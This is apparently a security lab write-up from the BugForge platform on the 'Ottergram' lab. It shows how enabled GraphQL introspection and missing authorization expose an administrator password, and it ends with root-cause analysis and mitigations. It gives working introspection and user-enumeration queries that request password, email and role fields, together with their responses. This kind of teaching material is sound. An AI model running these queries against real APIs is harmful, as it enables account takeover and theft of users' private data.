---
title: "GraphQL Introspection and Sensitive Data Exposure | Ottergram"
date: 2026-05-10 03:45:00 +0530
categories: [Web Security]
tags: [graphql, introspection, information-disclosure, api-security, sensitive-data-exposure, bugforge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/imaesg/posts/ottergram-graphql.webp
  alt: GraphQL Introspection and Sensitive Data Exposure in Ottergram
---

# GraphQL Introspection and Sensitive Data Exposure | Ottergram

## Overview

While testing Ottergram, the application was found using a GraphQL backend for handling user-related functionality.

GraphQL provides flexible querying capabilities, but insecure configurations can expose internal application structures and sensitive data if authorization and schema restrictions are not properly implemented.

This lab demonstrated how enabled GraphQL introspection combined with missing access controls allowed extraction of sensitive user information, including administrator credentials.

---

## Objective

The objective was to assess the GraphQL implementation for:

- exposed schema information
- insecure introspection
- excessive data exposure
- missing authorization controls

---

## Reconnaissance

After registering an account and browsing the application functionality, requests were intercepted using Burp Suite.

A GraphQL endpoint was identified:

```http
POST /graphql HTTP/2
```

The application used GraphQL queries to retrieve analytics data associated with user profiles.

Example request:

```json
{
  "query":"query { analytics(userId: 4) { userId username totalPosts } }"
}
```

The response returned internal user analytics data:

```json
{
  "data": {
    "analytics": {
      "userId": 4,
      "username": "kelvin",
      "totalPosts": 1
    }
  }
}
```

This confirmed that backend objects were directly queryable using user-controlled identifiers.

---

## GraphQL Introspection

To enumerate the backend schema, a GraphQL introspection query was executed:

```json
{
  "query":"{ __schema { types { name fields { name } } } }"
}
```

The server responded successfully with the full GraphQL schema.

This exposed internal object structures, available queries, and sensitive fields that should not have been accessible to untrusted users.

During schema enumeration, sensitive fields such as the following were discovered:

```json
{
  "name":"password"
}
```

The presence of a `password` field inside queryable objects indicated a serious backend design issue.

---

## Exploitation

After identifying accessible query structures, direct user enumeration was attempted using the `user` query.

```json
{
  "query":"{ u1: user(id: 2) { id username email password role } }"
}
```

The response exposed administrator account information directly through the GraphQL API:

```json
{
  "data": {
    "u1": {
      "id": 2,
      "username": "admin",
      "role": "admin",
      "password": "bug{...}"
    }
  }
}
```

This confirmed multiple critical security failures:

- GraphQL introspection enabled in production
- sensitive schema disclosure
- insecure direct object access
- excessive data exposure
- plaintext password exposure
- missing authorization checks

---

## Proof of Exploitation

### Attack Flow

```text
User registration
        ↓
GraphQL endpoint discovery
        ↓
Analytics query analysis
        ↓
GraphQL introspection enabled
        ↓
Schema enumeration
        ↓
Sensitive field discovery
        ↓
Direct user object queries
        ↓
Administrator credential disclosure
```

---

## Root Cause Analysis

The vulnerability existed due to multiple insecure GraphQL design decisions.

### Introspection Enabled in Production

The server exposed the entire backend schema through introspection queries.

This allowed attackers to:

- enumerate objects
- identify hidden fields
- discover internal queries
- map application logic

---

### Missing Authorization Controls

Sensitive objects could be queried directly using arbitrary user IDs.

The backend failed to verify whether the authenticated user was authorized to access requested resources.

---

### Excessive Data Exposure

The API returned internal fields that should never be exposed to frontend users, including:

- email addresses
- roles
- password values

---

### Insecure Credential Storage

The application exposed passwords directly through API responses, strongly suggesting insecure password handling practices.

Passwords should never be retrievable in plaintext under any circumstance.

---

## Impact

An attacker could potentially:

- enumerate application users
- access private account information
- identify privileged accounts
- extract administrator credentials
- map backend GraphQL structures
- compromise administrative functionality

In real-world applications, vulnerabilities like this frequently lead to complete application compromise.

---

## Mitigation

### Disable Introspection in Production

GraphQL introspection should be disabled for untrusted users in production environments.

---

### Enforce Authorization Checks

Every resolver should validate whether the authenticated user is authorized to access requested resources.

---

### Restrict Sensitive Fields

Sensitive backend fields such as:

```text
password
email
role
internal_notes
tokens
```

should never be exposed unless absolutely required.

---

### Apply Proper Password Security

Passwords must:

- never be stored in plaintext
- be securely hashed
- never be retrievable through APIs

---

### Implement Query Hardening

GraphQL APIs should implement:

- query whitelisting
- depth limiting
- field restrictions
- schema hardening
- resolver-level authorization

---

## Real-World Insight

GraphQL introduces a unique attack surface compared to traditional REST APIs.

When introspection is enabled and authorization is weak, attackers can effectively map the entire backend application without guessing endpoints manually.

This frequently leads to:

- hidden functionality discovery
- sensitive field enumeration
- excessive data exposure
- privilege escalation

The flexibility of GraphQL becomes dangerous when backend security assumptions are incorrect.

This lab demonstrates how a single introspection query can transform a limited API into a fully discoverable attack surface.